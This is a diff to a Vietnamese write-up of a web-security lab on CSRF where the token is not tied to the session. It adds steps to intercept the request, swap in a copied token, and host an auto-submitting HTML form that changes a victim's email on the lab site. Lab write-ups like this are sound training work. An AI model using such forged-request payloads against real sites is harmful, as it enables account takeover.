@@ -93,23 +93,37 @@ Vì server không yêu cầu CSRF token → email của bot sẽ bị đổi.
 
 ### 4.CSRF where token is not tied to user session
 
-- Mô tả: Chức năng thay đổi email của bài lab này dễ bị tấn công CSRF. Bài lab sử dụng mã thông báo để cố gắng ngăn chặn các cuộc tấn công CSRF, nhưng chúng không được tích hợp vào hệ thống xử lý session của trang web. Có hai tài khoản trên ứng dụng mà có thể sử dụng để hỗ trợ cuộc tấn công. Thông tin đăng nhập:
-
-wiener:peter
-
-carlos:montoya
+- Mô tả: Chức năng thay đổi email của bài lab này dễ bị tấn công CSRF. Bài lab sử dụng mã thông báo để cố gắng ngăn chặn các cuộc tấn công CSRF, nhưng chúng không được tích hợp vào hệ thống xử lý session của trang web.  Sử dụng exploit server để lưu trữ trang HTML sử dụng tấn công CSRF thay đổi địa chỉ email của người xem.
 
 - POC:
-1.
+1. Mở lab và đăng nhập tài khoản wiener:peter, đổi gmail và chặn request đổi gmail
 
 <img width="795" height="349" alt="image" src="https://github.com/user-attachments/assets/920506b8-e84f-4b14-9902-6ce7bafa49f4" />
+
+2. Copy csrf token và drop request đổi gmail
 
 <img width="1058" height="460" alt="image" src="https://github.com/user-attachments/assets/5b2b0982-31a5-4876-8e20-c899d6d8fb81" />
 
 <img width="847" height="228" alt="image" src="https://github.com/user-attachments/assets/41e3d217-9bd9-4d7d-b15a-b473ca9ba7e1" />
 
+3. Thay csrf token vừa copy vào payload:
+
+````
+<html>
+<body>
+<form action="https://0a9c001803a768c38057c1ce00bd00ff.web-security-academy.net/my-account/change-email" method="POST">
+  <input type="hidden" name="email" value="hwllnah@gmail.com" />
+  <input type="hidden" name="csrf" value="D3kOYWzgitiVQx4O8nBoVECNm2comh1V" />
+</form>
+<script>
+  document.forms[0].submit();
+</script>
+</body>
+</html>
+````
+
 <img width="1152" height="380" alt="image" src="https://github.com/user-attachments/assets/1cb961b1-394c-4d57-ad16-63e3f107dc2f" />
 
-<img width="1095" height="179" alt="image" src="https://github.com/user-attachments/assets/d09bd1f6-d931-417a-a24f-1552c08d51ce" />
+5. Kết quả
 
-2.
+<img width="1095" height="179" alt="image" src="https://github.com/user-attachments/assets/d09bd1f6-d931-417a-a24f-1552c08d51ce" />
